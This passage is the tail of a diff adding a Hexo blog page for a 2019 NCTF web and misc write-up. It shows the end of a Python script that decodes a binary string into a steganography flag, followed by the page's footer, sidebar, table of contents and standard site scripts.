class="number">2</span></span><br><span class="line">            <span class="keyword">print</span> goflag(bin_str)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">goflag</span><span class="params">(bin_str)</span>:</span></span><br><span class="line">    res_str = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, len(bin_str), <span class="number">8</span>):</span><br><span class="line">        res_str += chr(int(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> res_str</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    solve_stego()</span><br></pre></td></tr></table></figure>
+
+<p><img src="../../../../image/2019nctf/7-4.png" alt></p>
+
+      
+    </div>
+
+    
+
+    
+      
+    
+
+    
+    
+    
+
+
+
+    
+    
+
+    
+      
+    
+    
+
+    
+      <div>
+        
+
+
+
+
+  
+
+
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>cuo kon</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    
+    <a href="http://cuokon.github.com/2019/11/24/nctf/" title="2019nctf wp(web,misc)">http://cuokon.github.com/2019/11/24/nctf/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        
+          
+        
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/10/10/sql过狗(联合注入)/" rel="next" title="sql过狗(联合注入)">
+                <i class="fa fa-chevron-left"></i> sql过狗(联合注入)
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+  
+    
+    
+  <div class="comments" id="comments">
+    <div id="lv-container" data-id="city" data-uid="MTAyMC80NTY1Ni8yMjE2Nw=="></div>
+  </div>
+  
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  
+    <img class="site-author-image" itemprop="image" src="https://avatars3.githubusercontent.com/u/43626445" alt="cuo kon">
+  
+  <p class="site-author-name" itemprop="name">cuo kon</p>
+  <div class="site-description motion-element" itemprop="description"></div>
+</div>
+
+
+  <nav class="site-state motion-element">
+    
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">11</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/categories/">
+          
+        
+        
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+        </a>
+      </div>
+    
+
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+
+
+
+
+
+
+
+  <div class="links-of-author motion-element">
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/cuokon" title="GitHub &rarr; https://github.com/cuokon" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="mailto:2804745224@qq.com" title="E-Mail &rarr; mailto:2804745224@qq.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+    
+  </div>
+
+
+
+  <div class="cc-license motion-element" itemprop="license">
+  
+  
+    
+  
+  
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+
+  <div class="links-of-blogroll motion-element links-of-blogroll-block">
+    <div class="links-of-blogroll-title">
+      <i class="fa  fa-fw fa-link"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+      
+        <li class="links-of-blogroll-item">
+          <a href="https://www.fxnetw.com" title="https://www.fxnetw.com" rel="noopener" target="_blank">风雪's Blog</a>
+        </li>
+      
+        <li class="links-of-blogroll-item">
+          <a href="https://shadownb.github.io/" title="https://shadownb.github.io/" rel="noopener" target="_blank">shadow's Blog</a>
+        </li>
+      
+        <li class="links-of-blogroll-item">
+          <a href="https://www.lbx0726.com/" title="https://www.lbx0726.com/" rel="noopener" target="_blank">lbx0726's Blog</a>
+        </li>
+      
+        <li class="links-of-blogroll-item">
+          <a href="https://soyawww.github.io/" title="https://soyawww.github.io/" rel="noopener" target="_blank">soya's Blog</a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+          
+          
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB"><span class="nav-number">1.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#第一题"><span class="nav-number">1.1.</span> <span class="nav-text">第一题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第二题"><span class="nav-number">1.2.</span> <span class="nav-text">第二题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第三题"><span class="nav-number">1.3.</span> <span class="nav-text">第三题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第四题"><span class="nav-number">1.4.</span> <span class="nav-text">第四题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第五题"><span class="nav-number">1.5.</span> <span class="nav-text">第五题</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MISC"><span class="nav-number">2.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#第一题-1"><span class="nav-number">2.1.</span> <span class="nav-text">第一题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第二题-1"><span class="nav-number">2.2.</span> <span class="nav-text">第二题</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2018 – <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">cuo kon</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+    <span title="站点总字数">27k</span>
+  
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    
+    <span title="站点阅读时长">24 分钟</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.9.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.2.0</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+
+  
+    <span class="post-meta-divider">|</span>
+  
+
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="总访问量">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+
+  
+    
+    
+  
+  <script color="0,0,255" opacity="0.5" zindex="-1" count="99" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+
+  
+  <script src="/lib/fancybox/source/jquery.fancybox.pack.js"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+
+
+  <script src="/js/utils.js?v=7.2.0"></script>
+
+  <script src="/js/motion.js?v=7.2.0"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/affix.js?v=7.2.0"></script>
+
+  <script src="/js/schemes/pisces.js?v=7.2.0"></script>
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.2.0"></script>
+<script src="/js/post-details.js?v=7.2.0"></script>
+
+
+
+  <script src="/js/next-boot.js?v=7.2.0"></script>
+
+  
+
+  
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.2.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+
+
+
+<script>
+  window.livereOptions = {
+    refer: '2019/11/24/nctf/'
+  };
+  (function(d, s) {
+    var j, e = d.getElementsByTagName(s)[0];
+    if (typeof LivereTower === 'function') { return; }
+    j = d.createElement(s);
+    j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+    j.async = true;
+    e.parentNode.insertBefore(j, e);
+  })(document, 'script');
+</script>
+
+
+  
+
+</body>
+</html>
